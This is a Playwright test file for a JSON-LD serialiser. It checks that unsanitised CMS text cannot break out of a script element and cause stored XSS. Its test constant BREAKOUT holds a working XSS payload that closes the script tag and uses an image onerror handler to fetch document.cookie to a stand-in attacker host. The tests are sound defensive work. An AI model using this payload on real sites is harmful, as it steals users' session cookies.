import { test, expect } from "@playwright/test";
import { serializeJsonLd, articleJsonLd, faqPageJsonLd, breadcrumbJsonLd } from "../lib/seo/jsonld";

/**
 * Stored-XSS guard for the JSON-LD serialiser (lib/seo/jsonld.ts).
 *
 * Every string in a JSON-LD payload is unsanitised CMS text. `JSON.stringify`
 * does not escape `<`, and `components/site/json-ld.tsx` embeds the result via
 * `dangerouslySetInnerHTML`, so an unescaped `</script>` in any CMS field would
 * close the script element early and turn the remainder into live DOM.
 *
 * These are pure-logic assertions -- no browser required.
 */

const BREAKOUT = 'Update</script><img src=x onerror="fetch(`https://evil.tld/?c=${document.cookie}`)">';

test.describe("JSON-LD serialisation escapes markup", () => {
  test("no raw '<' survives serialisation", () => {
    const out = serializeJsonLd({ headline: BREAKOUT });

    expect(out).not.toContain("<");
    expect(out).not.toContain("</script>");
    expect(out).toContain("\\u003c");
  });

  test("escaping is lossless -- crawlers still read the original string", () => {
    const out = serializeJsonLd({ headline: BREAKOUT });

    expect(JSON.parse(out)).toEqual({ headline: BREAKOUT });
  });

  test("array payloads are escaped too", () => {
    const out = serializeJsonLd([{ a: BREAKOUT }, { b: BREAKOUT }]);

    expect(out).not.toContain("<");
    expect(JSON.parse(out)).toEqual([{ a: BREAKOUT }, { b: BREAKOUT }]);
  });

  test("nested values are escaped, not just top-level ones", () => {
    const out = serializeJsonLd({ author: { name: BREAKOUT } });

    expect(out).not.toContain("<");
  });

  // The real sinks: each of these takes CMS text an editor fully controls.
  test("articleJsonLd headline and description are safe", () => {
    const out = serializeJsonLd(
      articleJsonLd({ title: BREAKOUT, description: BREAKOUT, url: "https://x.tld/a" }),
    );

    expect(out).not.toContain("<");
  });

  test("faqPageJsonLd question and answer are safe", () => {
    const out = serializeJsonLd(faqPageJsonLd([{ question: BREAKOUT, answer: BREAKOUT }]));

    expect(out).not.toContain("<");
  });

  test("breadcrumbJsonLd names are safe", () => {
    const out = serializeJsonLd(breadcrumbJsonLd([{ name: BREAKOUT, path: "/articles/a" }], "en"));

    expect(out).not.toContain("<");
  });

  test("ordinary content is left readable", () => {
    // Guards against over-escaping that would corrupt normal titles.
    const out = serializeJsonLd({ headline: "Q4 platform update: CRM & ERP" });

    expect(out).toBe('{"headline":"Q4 platform update: CRM & ERP"}');
  });
});
